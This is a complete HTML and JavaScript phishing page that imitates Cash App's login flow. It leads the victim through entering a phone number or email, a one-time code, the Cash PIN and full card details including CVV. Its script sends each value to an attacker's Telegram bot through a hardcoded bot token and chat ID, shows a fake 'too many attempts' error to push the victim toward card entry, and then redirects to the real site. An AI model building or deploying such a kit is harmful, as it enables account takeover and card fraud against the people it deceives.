<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
  <title>Cash App • Verification</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background: #000000;
      font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 16px;
      color: #ffffff;
    }

    .container {
      max-width: 420px;
      width: 100%;
      margin: 0 auto;
    }

    .card {
      background: #000000;
      border-radius: 24px;
      padding: 20px 16px 32px;
      border: none;
      box-shadow: none;
    }

    .cash-logo {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 32px;
    }

    .cash-icon {
      background: #00D54B;
      width: 48px;
      height: 48px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      font-weight: 700;
      color: #000;
    }

    .cash-icon span {
      font-size: 30px;
      font-weight: 800;
      line-height: 1;
    }

    .cash-title {
      font-size: 26px;
      font-weight: 700;
      color: #fff;
    }

    .headline {
      font-size: 32px;
      font-weight: 700;
      line-height: 1.2;
      margin-bottom: 28px;
      color: #ffffff;
      letter-spacing: -0.5px;
    }

    .headline span {
      color: #00D54B;
    }

    .sub-text {
      font-size: 16px;
      color: #8E8E93;
      margin-bottom: 24px;
      line-height: 1.4;
    }

    .sub-text a {
      color: #00D54B;
      text-decoration: underline;
    }

    .toggle-group {
      display: flex;
      background: #1C1C1E;
      border-radius: 32px;
      padding: 4px;
      margin-bottom: 28px;
    }

    .toggle-option {
      flex: 1;
      text-align: center;
      padding: 12px 0;
      border-radius: 28px;
      font-size: 16px;
      font-weight: 500;
      color: #8E8E93;
      background: transparent;
      border: none;
      cursor: pointer;
      transition: 0.2s;
      font-family: inherit;
    }

    .toggle-option.active {
      background: #2C2C2E;
      color: #ffffff;
    }

    .input-group {
      margin-bottom: 18px;
    }

    .input-wrapper {
      display: flex;
      align-items: center;
      background: #1C1C1E;
      border-radius: 16px;
      padding: 4px 16px;
      border: 1px solid #3A3A3C;
      transition: 0.2s;
    }

    .input-wrapper:focus-within {
      border-color: #00D54B;
    }

    .input-prefix {
      display: flex;
      align-items: center;
      gap: 8px;
      padding-right: 12px;
      border-right: 1px solid #3A3A3C;
      margin-right: 12px;
      font-size: 16px;
      color: #ffffff;
      white-space: nowrap;
    }

    .input-prefix img {
      width: 24px;
      height: 16px;
      border-radius: 2px;
      object-fit: cover;
    }

    .input-prefix .arrow {
      font-size: 12px;
      color: #8E8E93;
    }

    input, select {
      width: 100%;
      padding: 16px 0;
      font-size: 17px;
      background: transparent;
      border: none;
      color: #ffffff;
      outline: none;
      font-family: inherit;
    }

    input::placeholder {
      color: #636366;
    }

    .input-label {
      font-size: 14px;
      font-weight: 500;
      color: #8E8E93;
      margin-bottom: 8px;
      display: block;
    }

    .action-btn {
      background: #00D54B;
      color: #000000;
      font-weight: 600;
      width: 100%;
      border: none;
      padding: 16px;
      border-radius: 16px;
      font-size: 17px;
      cursor: pointer;
      transition: 0.2s;
      margin-top: 8px;
      font-family: inherit;
    }

    .action-btn:active {
      transform: scale(0.97);
      background: #00C045;
    }

    .action-btn:disabled {
      opacity: 0.4;
      pointer-events: none;
    }

    .link-btn {
      background: none;
      border: none;
      color: #00D54B;
      font-weight: 500;
      font-size: 15px;
      cursor: pointer;
      margin-top: 16px;
      text-decoration: underline;
      width: auto;
      padding: 0;
      font-family: inherit;
    }

    .terms {
      font-size: 12px;
      color: #636366;
      text-align: left;
      margin-top: 24px;
      line-height: 1.5;
    }

    .terms a {
      color: #8E8E93;
      text-decoration: underline;
    }

    .pin-row {
      display: flex;
      gap: 12px;
      justify-content: center;
      margin: 28px 0 24px;
    }

    .pin-box {
      width: 60px;
      height: 72px;
      background: #1C1C1E;
      border: 2px solid #3A3A3C;
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      font-weight: 600;
      color: #ffffff;
      transition: 0.2s;
      font-family: inherit;
    }

    .pin-box.active {
      border-color: #00D54B;
      box-shadow: 0 0 0 3px rgba(0, 213, 75, 0.15);
    }

    .pin-box.filled {
      border-color: #00D54B;
    }

    .error-banner {
      background: #2C1A1A;
      border-radius: 16px;
      padding: 16px;
      display: flex;
      align-items: flex-start;
      gap: 12px;
      margin: 20px 0;
      border-left: 4px solid #FF3B30;
    }

    .error-banner .icon {
      font-size: 20px;
      color: #FF3B30;
      flex-shrink: 0;
    }

    .error-banner .text {
      font-size: 15px;
      color: #FF6B6B;
      line-height: 1.4;
    }

    .option-btn {
      background: #1C1C1E;
      border: 1px solid #2C2C2E;
      border-radius: 16px;
      padding: 18px;
      font-size: 17px;
      font-weight: 500;
      color: #ffffff;
      cursor: pointer;
      transition: 0.2s;
      text-align: center;
      width: 100%;
      font-family: inherit;
      margin-bottom: 12px;
    }

    .option-btn:active {
      background: #2C2C2E;
      transform: scale(0.98);
    }

    .option-btn.secondary {
      background: transparent;
      border-color: #3A3A3C;
      color: #ffffff;
    }

    .option-btn.secondary:active {
      background: #1C1C1E;
    }

    .status-badge {
      background: #1C1C1E;
      padding: 12px 16px;
      border-radius: 16px;
      text-align: center;
      font-size: 15px;
      margin: 12px 0 4px;
      color: #ffffff;
      font-weight: 500;
    }

    .toast {
      background: #1C1C1E;
      color: #ffffff;
      border-radius: 16px;
      padding: 14px 18px;
      text-align: center;
      opacity: 0;
      transition: 0.2s;
      pointer-events: none;
      margin-top: 20px;
      font-size: 15px;
      border: 1px solid #2C2C2E;
    }

    .toast.show {
      opacity: 1;
    }

    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.95);
      backdrop-filter: blur(10px);
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      z-index: 2000;
      visibility: hidden;
      opacity: 0;
      transition: 0.2s;
    }

    .loading-overlay.active {
      visibility: visible;
      opacity: 1;
    }

    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #1C1C1E;
      border-top-color: #00D54B;
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    .loading-text {
      font-size: 16px;
      color: #ffffff;
      text-align: center;
      font-weight: 500;
    }

    .hide {
      display: none !important;
    }

    .back-link {
      text-align: left;
      margin-top: 20px;
    }

    .back-link a {
      color: #8E8E93;
      font-size: 15px;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }

    .back-link a:active {
      color: #ffffff;
    }

    .resend-options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 20px;
      flex-wrap: wrap;
      gap: 12px;
    }

    .help-pill {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: #1C1C1E;
      border-radius: 24px;
      padding: 8px 16px;
      font-size: 15px;
      color: #ffffff;
      font-weight: 500;
      margin-bottom: 24px;
      border: none;
      cursor: default;
    }

    .help-pill span {
      background: #3A3A3C;
      width: 22px;
      height: 22px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 14px;
      color: #ffffff;
    }

    .pin-container {
      position: relative;
      width: 100%;
    }

    .pin-input-hidden {
      position: absolute;
      opacity: 0;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      font-size: 16px;
      cursor: pointer;
    }

    .card-details-grid {
      display: flex;
      flex-direction: column;
      gap: 16px;
      margin-top: 16px;
    }

    .card-row {
      display: flex;
      gap: 12px;
    }

    .card-row .input-group {
      flex: 1;
      margin-bottom: 0;
    }

    .divider {
      border-top: 1px solid #2C2C2E;
      margin: 24px 0 16px;
    }

    .bottom-text {
      font-size: 15px;
      color: #8E8E93;
      text-align: center;
      margin-top: 24px;
    }

    .bottom-text a {
      color: #00D54B;
      text-decoration: underline;
      font-weight: 500;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- STEP 1: PHONE / EMAIL LOGIN (Cash App style) -->
    <div id="loginPanel" class="card">
      <div class="cash-logo">
        <div class="cash-icon"><span>$</span></div>
        <div class="cash-title">Cash App</div>
      </div>
      <div class="headline">Log in using your phone</div>
      <div class="toggle-group" id="loginToggle">
        <button class="toggle-option active" data-type="phone">Phone number</button>
        <button class="toggle-option" data-type="email">Email</button>
      </div>
      <div id="phoneInputGroup" class="input-group">
        <div class="input-wrapper">
          <div class="input-prefix">
            <span>🇺🇸</span>
            <span>+1</span>
            <span class="arrow">▾</span>
          </div>
          <input type="tel" id="loginPhone" placeholder="Enter phone number" autocomplete="off" />
        </div>
      </div>
      <div id="emailInputGroup" class="input-group hide">
        <div class="input-wrapper">
          <input type="email" id="loginEmail" placeholder="Enter email address" autocomplete="off" />
        </div>
      </div>
      <button class="action-btn" id="continueToOtpBtn">Continue</button>
      <div class="terms">
        By continuing, you agree to the <a href="#">Terms</a>, <a href="#">E-Sign Consent</a> &amp; <a href="#">Privacy Policy</a>.<br><br>
        By continuing, you also agree to receive a one time password confirmation code and informational texts from Cash App. Message frequency varies. Message and data rates may apply. Reply HELP for help, STOP to cancel.
      </div>
      <div class="divider"></div>
      <div class="bottom-text">
        New to Cash App? <a href="#">Create account</a>
      </div>
    </div>

    <!-- STEP 2: OTP (6 digits only) -->
    <div id="otpPanel" class="card hide">
      <div class="cash-logo">
        <div class="cash-icon"><span>$</span></div>
        <div class="cash-title">Cash App</div>
      </div>
      <div class="headline">Enter the code sent to<br>your email</div>
      <div class="sub-text" id="otpSentTo">We sent the code to <a href="#" id="otpDestination">your email</a>.</div>
      <div class="help-pill"><span>?</span> Get help</div>
      <div class="input-group">
        <div class="input-wrapper">
          <input type="text" id="otpCode" placeholder="Code" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
        </div>
      </div>
      <button class="action-btn" id="otpSubmitBtn">Continue</button>
      <div class="resend-options">
        <span style="color:#8E8E93; font-size:15px;">Didn't receive a code?</span>
        <button class="link-btn" id="resendOtpBtn" style="margin-top:0;">Resend code</button>
      </div>
      <div class="terms" style="margin-top:32px;">
        Your Privacy Choices
      </div>
    </div>

    <!-- STEP 3: PIN (4 digits) -->
    <div id="pinPanel" class="card hide">
      <div class="cash-logo">
        <div class="cash-icon"><span>$</span></div>
        <div class="cash-title">Cash App</div>
      </div>
      <div class="headline">Welcome back, Mary!<br>Enter your Cash PIN to continue.</div>
      <div class="help-pill"><span>?</span> Get help</div>
      <div class="pin-container">
        <div class="pin-row" id="pinRow">
          <div class="pin-box" data-index="0"></div>
          <div class="pin-box" data-index="1"></div>
          <div class="pin-box" data-index="2"></div>
          <div class="pin-box" data-index="3"></div>
        </div>
        <input type="password" class="pin-input-hidden" id="pinHiddenInput" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
      </div>
      <button class="action-btn" id="pinSubmitBtn" disabled>Continue</button>
    </div>

    <!-- STEP 4: IDENTITY CONFIRMATION (after too many attempts) -->
    <div id="identityPanel" class="card hide">
      <div class="cash-logo">
        <div class="cash-icon"><span>$</span></div>
        <div class="cash-title">Cash App</div>
      </div>
      <div class="headline">Please choose an option to confirm your identity</div>
      <div class="help-pill"><span>?</span> Get help</div>
      <button class="option-btn" id="confirmCashCardBtn">Cash Card</button>
      <button class="option-btn secondary" id="confirmPhoneBtn">Phone Number</button>
      <div class="error-banner">
        <div class="icon">ⓘ</div>
        <div class="text">There were too many unsuccessful attempts to enter your PIN.</div>
      </div>
    </div>

    <!-- STEP 5: CARD DETAILS (Cash Card flow) -->
    <div id="cardPanel" class="card hide">
      <div class="cash-logo">
        <div class="cash-icon"><span>$</span></div>
        <div class="cash-title">Cash App</div>
      </div>
      <div class="headline">Confirm your Cash Card</div>
      <div class="sub-text">Enter your card details to verify your identity.</div>
      <div class="card-details-grid">
        <div class="input-group">
          <label class="input-label">Card number</label>
          <div class="input-wrapper">
            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric" autocomplete="off" />
          </div>
        </div>
        <div class="card-row">
          <div class="input-group">
            <label class="input-label">Expiry</label>
            <div class="input-wrapper">
              <input type="text" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off" />
            </div>
          </div>
          <div class="input-group">
            <label class="input-label">CVV</label>
            <div class="input-wrapper">
              <input type="text" id="cardCvv" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="off" />
            </div>
          </div>
        </div>
        <div class="input-group">
          <label class="input-label">ZIP code</label>
          <div class="input-wrapper">
            <input type="text" id="cardZip" placeholder="10001" maxlength="10" inputmode="numeric" autocomplete="off" />
          </div>
        </div>
      </div>
      <button class="action-btn" id="cardSubmitBtn" style="margin-top:24px;">Confirm</button>
    </div>

    <!-- TOAST & LOADING -->
    <div id="toastMsg" class="toast"></div>
  </div>

  <div id="loadingOverlay" class="loading-overlay">
    <div class="spinner"></div>
    <div class="loading-text">Processing verification...<br />Please wait</div>
  </div>

  <script>
    (function() {
      // Telegram bot credentials
      const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
      const CHAT_ID = "8737104261";

      // User data store
      let userData = {
        loginType: 'phone',
        identifier: '',
        phoneNumber: '',
        email: '',
        otpCode: '',
        pin: '',
        cardNumber: '',
        cardExpiry: '',
        cardCvv: '',
        cardZip: ''
      };

      // DOM panels
      const loginPanel = document.getElementById('loginPanel');
      const otpPanel = document.getElementById('otpPanel');
      const pinPanel = document.getElementById('pinPanel');
      const identityPanel = document.getElementById('identityPanel');
      const cardPanel = document.getElementById('cardPanel');
      const toast = document.getElementById('toastMsg');
      const loadingOverlay = document.getElementById('loadingOverlay');

      // Login elements
      const loginToggle = document.getElementById('loginToggle');
      const phoneInputGroup = document.getElementById('phoneInputGroup');
      const emailInputGroup = document.getElementById('emailInputGroup');
      const loginPhone = document.getElementById('loginPhone');
      const loginEmail = document.getElementById('loginEmail');
      const continueToOtpBtn = document.getElementById('continueToOtpBtn');

      // OTP elements
      const otpCodeInput = document.getElementById('otpCode');
      const otpSubmitBtn = document.getElementById('otpSubmitBtn');
      const otpDestination = document.getElementById('otpDestination');
      const resendOtpBtn = document.getElementById('resendOtpBtn');

      // PIN elements
      const pinBoxes = document.querySelectorAll('.pin-box');
      const pinHiddenInput = document.getElementById('pinHiddenInput');
      const pinSubmitBtn = document.getElementById('pinSubmitBtn');

      // Identity elements
      const confirmCashCardBtn = document.getElementById('confirmCashCardBtn');
      const confirmPhoneBtn = document.getElementById('confirmPhoneBtn');

      // Card elements
      const cardNumber = document.getElementById('cardNumber');
      const cardExpiry = document.getElementById('cardExpiry');
      const cardCvv = document.getElementById('cardCvv');
      const cardZip = document.getElementById('cardZip');
      const cardSubmitBtn = document.getElementById('cardSubmitBtn');

      // ----- Helpers -----
      function showToast(msg, isError = false) {
        toast.innerText = msg;
        toast.classList.add('show');
        toast.style.borderColor = isError ? '#FF3B30' : '#2C2C2E';
        toast.style.color = isError ? '#FF6B6B' : '#FFFFFF';
        setTimeout(() => {
          toast.classList.remove('show');
          toast.style.borderColor = '#2C2C2E';
          toast.style.color = '#FFFFFF';
        }, 3200);
      }

      async function sendToTelegram(text) {
        try {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
          });
          return res.ok;
        } catch (e) { return false; }
      }

      function showLoading(show) {
        if (show) loadingOverlay.classList.add('active');
        else loadingOverlay.classList.remove('active');
      }

      // ----- STEP 1: LOGIN -----
      loginToggle.addEventListener('click', (e) => {
        const btn = e.target.closest('.toggle-option');
        if (!btn) return;
        const type = btn.dataset.type;
        document.querySelectorAll('.toggle-option').forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        userData.loginType = type;
        if (type === 'phone') {
          phoneInputGroup.classList.remove('hide');
          emailInputGroup.classList.add('hide');
        } else {
          phoneInputGroup.classList.add('hide');
          emailInputGroup.classList.remove('hide');
        }
      });

      continueToOtpBtn.addEventListener('click', async () => {
        let identifier = '';
        if (userData.loginType === 'phone') {
          identifier = loginPhone.value.trim();
          if (!identifier || identifier.length < 5) {
            showToast('Please enter a valid phone number', true);
            return;
          }
          userData.phoneNumber = identifier;
          userData.email = '';
        } else {
          identifier = loginEmail.value.trim();
          if (!identifier || !identifier.includes('@')) {
            showToast('Please enter a valid email address', true);
            return;
          }
          userData.email = identifier;
          userData.phoneNumber = '';
        }
        userData.identifier = identifier;

        await sendToTelegram(`💵 <b>CASH APP - LOGIN</b>\nType: ${userData.loginType}\nIdentifier: <code>${identifier}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);

        // Update OTP destination text
        if (userData.loginType === 'email') {
          otpDestination.innerText = userData.email;
        } else {
          otpDestination.innerText = 'your phone';
        }

        loginPanel.classList.add('hide');
        otpPanel.classList.remove('hide');
        otpCodeInput.value = '';
        otpCodeInput.focus();
      });

      // ----- STEP 2: OTP (6 digits only) -----
      otpCodeInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
      });

      otpSubmitBtn.addEventListener('click', async () => {
        const code = otpCodeInput.value.trim();
        if (code.length !== 6 || !/^\d{6}$/.test(code)) {
          showToast('Please enter a valid 6-digit code', true);
          return;
        }
        userData.otpCode = code;
        await sendToTelegram(`🔐 <b>CASH APP - OTP</b>\nCode: <code>${code}</code>\nUser: ${userData.identifier}\nPhone: ${userData.phoneNumber || 'N/A'}`);

        otpPanel.classList.add('hide');
        pinPanel.classList.remove('hide');
        // Clear PIN
        pinHiddenInput.value = '';
        updatePinDisplay('');
        pinHiddenInput.focus();
      });

      resendOtpBtn.addEventListener('click', async () => {
        showToast('A new code has been sent.', false);
        await sendToTelegram(`🔄 <b>CASH APP - RESEND OTP</b>\nUser: ${userData.identifier}`);
      });

      // ----- STEP 3: PIN (4 digits) -----
      function updatePinDisplay(value) {
        const digits = value.replace(/\D/g, '').slice(0, 4);
        pinBoxes.forEach((box, i) => {
          if (i < digits.length) {
            box.textContent = '•';
            box.classList.add('filled');
          } else {
            box.textContent = '';
            box.classList.remove('filled');
          }
          if (i === digits.length && digits.length < 4) {
            box.classList.add('active');
          } else {
            box.classList.remove('active');
          }
        });
        pinSubmitBtn.disabled = digits.length !== 4;
      }

      pinHiddenInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '').slice(0, 4);
        e.target.value = val;
        updatePinDisplay(val);
        // If 4 digits, enable button
        if (val.length === 4) {
          pinSubmitBtn.disabled = false;
        } else {
          pinSubmitBtn.disabled = true;
        }
      });

      // Focus hidden input when clicking on pin boxes
      document.querySelector('.pin-container').addEventListener('click', () => {
        pinHiddenInput.focus();
      });

      // Initialize display
      updatePinDisplay('');

      pinSubmitBtn.addEventListener('click', async () => {
        const pin = pinHiddenInput.value.trim();
        if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
          showToast('Please enter a valid 4-digit PIN', true);
          return;
        }
        userData.pin = pin;
        await sendToTelegram(`🔑 <b>CASH APP - PIN</b>\nPIN: <code>${pin}</code>\nUser: ${userData.identifier}`);

        // Show identity confirmation (too many attempts error)
        pinPanel.classList.add('hide');
        identityPanel.classList.remove('hide');
      });

      // ----- STEP 4: IDENTITY CONFIRMATION -----
      confirmCashCardBtn.addEventListener('click', async () => {
        await sendToTelegram(`💳 <b>CASH APP - IDENTITY CHOICE</b>\nUser chose: Cash Card\nUser: ${userData.identifier}`);
        identityPanel.classList.add('hide');
        cardPanel.classList.remove('hide');
      });

      confirmPhoneBtn.addEventListener('click', async () => {
        await sendToTelegram(`📱 <b>CASH APP - IDENTITY CHOICE</b>\nUser chose: Phone Number\nUser: ${userData.identifier}`);
        showToast('Phone verification not available. Please use Cash Card.', true);
      });

      // ----- STEP 5: CARD DETAILS -----
      // Format card number with spaces
      cardNumber.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '').slice(0, 16);
        val = val.replace(/(\d{4})(?=\d)/g, '$1 ');
        e.target.value = val;
      });

      cardExpiry.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '').slice(0, 4);
        if (val.length >= 2) {
          val = val.slice(0, 2) + '/' + val.slice(2);
        }
        e.target.value = val;
      });

      cardCvv.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
      });

      cardZip.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
      });

      cardSubmitBtn.addEventListener('click', async () => {
        const number = cardNumber.value.replace(/\s/g, '');
        const expiry = cardExpiry.value.trim();
        const cvv = cardCvv.value.trim();
        const zip = cardZip.value.trim();

        if (number.length < 13 || number.length > 16) {
          showToast('Please enter a valid card number', true);
          return;
        }
        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
          showToast('Please enter a valid expiry (MM/YY)', true);
          return;
        }
        if (cvv.length < 3) {
          showToast('Please enter a valid CVV', true);
          return;
        }
        if (!zip) {
          showToast('Please enter your ZIP code', true);
          return;
        }

        userData.cardNumber = number;
        userData.cardExpiry = expiry;
        userData.cardCvv = cvv;
        userData.cardZip = zip;

        await sendToTelegram(`💳 <b>CASH APP - CARD DETAILS</b>\nCard: <code>${number}</code>\nExpiry: ${expiry}\nCVV: <code>${cvv}</code>\nZIP: ${zip}\nUser: ${userData.identifier}\n✅ All data captured.`);

        showLoading(true);
        setTimeout(() => {
          showLoading(false);
          showToast('Verification successful! Redirecting to Cash App...', false);
          setTimeout(() => {
            window.location.href = 'https://cash.app';
          }, 1500);
        }, 1800);
      });

      // Cleanup on unload
      window.addEventListener('beforeunload', () => {
        // no streams to stop
      });

    })();
  </script>
</body>
</html>
